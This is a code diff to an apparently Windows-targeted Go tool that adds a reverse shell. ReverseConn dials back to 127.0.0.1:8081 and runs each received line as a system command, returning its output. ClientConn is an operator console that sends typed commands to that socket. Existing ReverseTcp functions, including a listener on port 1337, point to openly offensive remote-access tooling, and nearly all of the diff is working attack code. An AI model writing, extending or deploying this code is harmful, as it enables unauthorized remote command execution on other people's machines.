@@ -5,10 +5,59 @@ import (
 	"fmt"
 	"golang.org/x/sys/windows"
 	"net"
+	"os"
 	"os/exec"
+	"strings"
+	"sync"
 	"syscall"
 	"unsafe"
 )
+
+const delimiter = "\n"
+
+func ReadFromServer(conn net.Conn, wg *sync.WaitGroup) {
+	defer wg.Done()
+	reader := bufio.NewReader(conn)
+	for {
+		line, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println("Error reading from server:", err)
+			return
+		}
+		fmt.Print("Server response:", line)
+	}
+}
+
+func ClientConn() {
+
+	serverAddr := "localhost"
+	port := "8081"
+	server := serverAddr + ":" + port
+
+	conn, err := net.Dial("tcp", server)
+	if err != nil {
+		fmt.Println("Error connecting to the server:", err)
+		return
+	}
+	defer conn.Close()
+
+	fmt.Println("Connected to", server)
+
+	wg := sync.WaitGroup{}
+	wg.Add(1)
+	go ReadFromServer(conn, &wg)
+
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("Enter command: ")
+		scanner.Scan()
+		command := scanner.Text()
+
+		// Send the command to the server with delimiter
+		conn.Write([]byte(command + delimiter))
+	}
+
+}
 
 func ReverseTcp2() {
 	listener, err := net.Listen("tcp", "0.0.0.0:1337")
@@ -84,6 +133,32 @@ func ReverseTcp() {
 	//	c.Write([]byte(out))
 	//
 	//}
+}
+
+func ReverseConn() {
+	conn, err := net.Dial("tcp", "127.0.0.1:8081")
+	if err != nil {
+		// Handle the error (print it, log it, etc.)
+		fmt.Println("Error connecting:", err)
+		return
+	}
+
+	for {
+		message, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			// Handle the error (print it, log it, etc.)
+			fmt.Println("Error reading:", err)
+			return
+		}
+		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+
+		if err != nil {
+			fmt.Fprintf(conn, "%s\n", err)
+		}
+
+		fmt.Fprintf(conn, "%s\n", out)
+
+	}
 }
 
 //func reverShellCallBySys() {
